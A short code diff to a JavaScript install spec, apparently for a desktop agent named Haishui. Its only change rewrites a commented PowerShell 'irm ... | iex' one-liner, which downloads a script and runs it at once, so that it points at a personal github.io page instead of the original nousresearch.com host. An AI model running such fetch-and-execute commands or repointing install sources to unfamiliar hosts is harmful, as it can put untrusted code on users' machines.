@@ -95,7 +95,7 @@ export function legId(name) {
 export const SPEC = {
   windows: {
     install: [
-      // irm https://haishui.nousresearch.com/install.ps1 | iex
+      // irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1 | iex
       { method: 'installer-script' },
       // The same one-liner with -IncludeDesktop: builds Haishui.exe AND
       // registers Start Menu / Desktop shortcuts, so it is a second real
